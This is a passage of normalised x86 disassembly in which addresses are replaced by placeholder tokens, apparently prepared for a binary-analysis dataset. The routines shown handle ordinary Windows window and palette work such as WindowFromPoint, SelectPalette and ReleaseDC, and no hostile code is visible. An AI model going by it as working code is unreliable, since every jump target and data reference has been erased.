je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b035
mov eax [ rw-data ]
call sub_4032a8
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_464294
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44da78
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_44a558
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_467f00
sub_44b035
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_44b0c4
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4496d4
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44b0f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_44b0c4
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_44c3b8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_4509a4
test eax eax
je r-xdata
mov esi eax
sub_44b140
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_418778
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx ] eax
sub_44b168
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_418a70
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4032a8
xor eax eax
mov [ ebx ] eax
sub_44b188
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44b1b8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418cd4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b268
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_44b241
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44b3f4
call sub_403b20
call sub_403b20
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188d4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4253e8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44b274
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418cd4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b312
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b319
mov eax [ rw-data ]
call sub_418d38
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_44b2ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44b3f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425444
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188d4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4253e8
test al al
je r-xdata
sub_44b320
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_44b3f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424f14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_44b34c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4255ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4255f0
mov eax [ ebp - 0x4 ]
call sub_44b440
mov eax [ rw-data ]
call sub_418cd4
mov ebx eax
xor eax eax
push ebp
push sub_44b3d1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
call sub_44b1b8
sub_44b3f4
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4255f0
mov edx ebx
mov eax [ rw-data ]
call sub_418ce8
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_44b440
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44cf08
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_44b46c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44b4a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419008
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_44b4f0
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_44b5ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44b679
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b680
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4034a4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_45c818
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_40911c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40408c
sub_44b69c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44b703
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_459220
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_44c874
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x64 ]
pop eax
call sub_404444
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b70a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov al 0x1
sub_44b710
push ebx
mov ebx eax
mov eax ebx
call sub_459248
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b744
push ebx
mov ebx eax
mov eax ebx
call sub_459298
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404444
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b77c
push ebx
mov ebx eax
mov eax ebx
call sub_4592d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b7b0
push ebx
mov ebx eax
mov eax ebx
call sub_42184c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b7d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c8a4
sub_44b7f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_44b818
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_40408c
sub_44b83c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44c794
sub_44b85c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_44b888
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404444
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_44b8ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c1c8
sub_44b90c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c1b4
sub_44b92c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_44b94c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420f48
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4242d0
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b46c
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_44d838
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44ba24
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403674
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46bebc
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
push edi
xor ecx ecx
mov edx 0xb039
call sub_44da78
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_44c214
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4034a4
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4032a8
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4032a8
mov eax [ edi + 0x68 ]
call sub_4032a8
mov eax [ edi + 0x64 ]
call sub_408c8c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420f94
test bl bl
jle r-xdata
sub_44baf0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_44bb18
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_4034a4
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44bba0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_44bea0
sub_44bbc0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44e894
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4034a4
mov edx ebx
mov eax edi
call sub_421018
mov eax ebx
mov si 0xffd9
call sub_4034a4
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44bc88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4213a8
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44da78
sub_44bd1c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421264
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44c82c
jmp r-xdata
xor edx edx
mov eax esi
call sub_44bbc0
sub_44bd60
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_4034a4
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_44bba0
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4034a4
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_44be08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44e008
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ccbc
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44bea0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44da78
mov eax ebx
mov si 0xffd0
call sub_4034a4
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_4034a4
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44bea0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_44bfbc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_44bfe0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_44c008
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_44c02c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_44c050
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_44c14b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
